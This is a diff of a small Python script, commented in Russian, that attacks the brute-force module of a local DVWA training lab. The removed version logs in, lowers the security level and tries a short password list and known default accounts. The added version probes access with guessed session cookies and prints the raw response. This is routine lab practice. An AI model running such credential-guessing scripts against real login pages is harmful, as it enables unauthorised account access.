@@ -1,53 +1,38 @@
 #!/usr/bin/python3
 import requests
-import re
 
-s = requests.Session()
+print("TEST START")
 
-# 1. Логинимся
-r = s.post("http://dvwa.local/login.php", 
-          data={'username':'admin','password':'password','Login':'Login'})
-print(f"Login: {r.status_code}, Cookies: {dict(s.cookies)}")
+# 1. Простой тест без сессии
+url = "http://dvwa.local/vulnerabilities/brute/?username=admin&password=password&Login=Login"
+r = requests.get(url)
+print(f"Direct test: {len(r.text)} chars")
 
-# 2. Security low
-s.post("http://dvwa.local/security.php",
-      data={'security':'low','seclev_submit':'Submit'})
+# 2. Проверяем что на странице
+if 'Welcome to the password protected area' in r.text:
+    print("SUCCESS! No login needed!")
+    exit()
 
-# 3. Пробуем пароли
-brute_url = "http://dvwa.local/vulnerabilities/brute/"
-passwords = ['password', '123456', 'admin', 'abc123']
+# 3. Если нет - пробуем с ручными cookies
+print("\nTrying with manual cookies...")
+cookies = {
+    'PHPSESSID': 'test123',  # Попробуем любой
+    'security': 'low'
+}
 
-for pwd in passwords:
-    url = f"{brute_url}?username=admin&password={pwd}&Login=Login"
-    r = s.get(url)
-    
-    # Проверяем ответ
-    text = r.text.lower()
-    
-    if 'welcome to the password protected area' in text:
-        print(f"\nSUCCESS: admin / {pwd}")
-        # Найдем полную строку
-        for line in r.text.split('\n'):
-            if 'welcome' in line.lower():
-                print(f"Proof: {line.strip()}")
-        break
-    elif 'username and/or password incorrect' in text:
-        print(f"FAILED: admin / {pwd}")
-    else:
-        print(f"UNKNOWN: admin / {pwd} ({len(r.text)} chars)")
-        # Покажем что там
-        clean = re.sub('<[^>]+>', ' ', r.text)
-        clean = ' '.join(clean.split())
-        if len(clean) > 50:
-            print(f"Text: {clean[:100]}...")
+headers = {
+    'User-Agent': 'Mozilla/5.0',
+    'Referer': 'http://dvwa.local/vulnerabilities/brute/'
+}
 
-# 4. Пробуем других пользователей
-users = [('gordonb', 'abc123'), ('1337', 'charley')]
-for user, pwd in users:
-    url = f"{brute_url}?username={user}&password={pwd}&Login=Login"
-    r = s.get(url)
-    if 'welcome' in r.text.lower():
-        print(f"\nSUCCESS: {user} / {pwd}")
-        break
+r = requests.get(url, cookies=cookies, headers=headers)
+print(f"With cookies: {len(r.text)} chars")
 
-print("\nDONE")
+# 4. Выводим ВЕСЬ ответ
+print("\n=== FULL RESPONSE ===")
+print(r.text)
+print("=== END ===")
+
+# 5. Команда для ручной проверки
+print("\nRUN THIS COMMAND:")
+print("curl -v 'http://dvwa.local/vulnerabilities/brute/?username=admin&password=password&Login=Login'")
